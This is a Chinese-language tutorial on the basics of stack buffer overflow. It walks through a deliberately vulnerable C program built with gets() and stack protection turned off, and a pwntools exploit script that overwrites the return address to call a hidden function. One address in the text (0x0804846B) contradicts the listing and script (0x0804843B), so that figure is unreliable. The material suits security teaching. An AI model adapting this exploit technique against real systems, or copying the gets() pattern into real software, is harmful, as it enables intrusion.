# 栈溢出原理

# 介绍

栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致栈中与其相邻的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞(比如说，还有向堆中写，向bss段写)。而对于黑客来说，栈溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是

- 程序必须向栈上写入数据。
- 写入的数据大小没有被良好地控制。

# 基本示例

最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，**当然需要确保这个地址的代码可以执行**。下面，我们举一个简单的例子：

```C
#include <stdio.h>
#include <string.h>
void success() { puts("You Hava already controlled it."); }
void vulnerable() {
  char s[12];
  gets(s);
  puts(s);
  return;
}
int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
```

这个程序的主要目的读取一个字符串，并将其输出。**我们希望可以控制程序执行success函数。**

我们利用如下命令对齐进行编译

```shell
➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example
stack_example.c: In function ‘vulnerable’:
stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
   gets(s);
   ^
/tmp/ccPU8rRA.o：在函数‘vulnerable’中：
stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and should not be used.
```

可以看出gets本身是一个危险函数。而它因为其从不检查输入字符串的长度，而是以回车来判断是否输入结束，所以很容易可以导致栈溢出，

> 历史上，**莫里斯蠕虫**第一种蠕虫病毒就利用了gets这个危险函数实现了栈溢出。

此外，-m32指的是生成32位程序，`-fno-stack-protector` 指的是不开启堆栈保护，即不生成canary，这是为了更加方便地介绍栈溢出的基本利用方式；而且该程序并没有开启ASLR保护。之后，我们利用IDA来反编译一下二进制程序并查看vulnerable函数 。可以看到

```C
int vulnerable()
{
  char s; // [sp+4h] [bp-14h]@1

  gets(&s);
  return puts(&s);
}
```

该字符串距离ebp的长度为0x14，那么相应的栈结构为

```text
                                           +-----------------+
                                           |     retaddr     |
                                           +-----------------+
                                           |     saved ebp   |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+
```

并且，我们可以通过IDA获得success的地址，其地址为0x0804846B。

```asm
.text:0804843B success         proc near
.text:0804843B                 push    ebp
.text:0804843C                 mov     ebp, esp
.text:0804843E                 sub     esp, 8
.text:08048441                 sub     esp, 0Ch
.text:08048444                 push    offset s        ; "You Hava already controlled it."
.text:08048449                 call    _puts
.text:0804844E                 add     esp, 10h
.text:08048451                 nop
.text:08048452                 leave
.text:08048453                 retn
.text:08048453 success         endp
```

那么如果我们读取的字符串为

```
0x14*'a'+'bbbb'+success_addr
```

那么，由于gets会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将saved ebp覆盖为bbbb，将retaddr覆盖为success_addr,即，此时的栈结构为

```text
                                           +-----------------+
                                           |    0x0804843B   |
                                           +-----------------+
                                           |       bbbb      |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+
```

但是需要注意的是，由于在计算机内存中，对应的每个值都是按照字节存储的。一般情况下都是采用小端存储，即0x0804843B的存储是如下结构

```text
\x3b\x84\x04\x08
```

但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候\，x等也算一个单独的字符。。所以我们需要想办法将\x3b之类的作为一个字符输入进去。那么此时我们就需要使用一波pwntools了(关于如何安装以及基本用法，请自行github)，这里利用pwntools的代码如下：

```python
#coding=utf8
from pwn import *
# 构造与程序交互的对象
sh = process('./stack_example')
success_addr = 0x0804843b
# 构造payload
payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)
print p32(success_addr)
# 向程序发送字符串
sh.sendline(payload)
# 将代码交互转换为手工交互
sh.interactive()
```

执行一波代码，可以得到

```shell
➜  stack-example python exp.py
[+] Starting local process './stack_example': pid 61936
;\x84\x0
[*] Switching to interactive mode
aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0
You Hava already controlled it.
[*] Got EOF while reading in interactive
$ 
[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)
[*] Got EOF while sending in interactive
```

可以看到我们确实已经执行success函数。

# 小总结

上面的示例其实也展示了栈溢出中比较重要的几个步骤:

## 寻找危险函数

通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。

常见的危险函数如下

- 输入
  - gets，直接读取一行，忽略'\x00'
  - scanf
  - vscanf
- 输出
  - sprintf
- 字符串
  - strcpy，字符串复制，遇到'\x00'停止
  - strcat，字符串拼接，遇到'\x00'停止
  - bcopy

## 确定填充长度

这一部分主要是计算**我们所要操作的地址与我们所要覆盖的地址的距离**。常见的操作方法就是打开IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式

- 相对于栈基地址的的索引
- 相对应栈顶指针的索引
- 直接地址索引

其中相对于栈基地址的索引，可以直接通过查看EBP相对偏移获得；相对于栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种问题。通过绝对地址索引的，就相当于直接给定了地址。一般来说，我们会有如下的覆盖需求

- **覆盖函数返回地址**，这时候就是直接看EBP即可。
- **覆盖栈上某个变量的内容**，这时候就需要更加精细的计算了。
- **覆盖bss段某个变量的内容**。
- 等等

**参考阅读**

[stack buffer overflow](https://en.wikipedia.org/wiki/Stack_buffer_overflow)

http://bobao.360.cn/learning/detail/3694.html

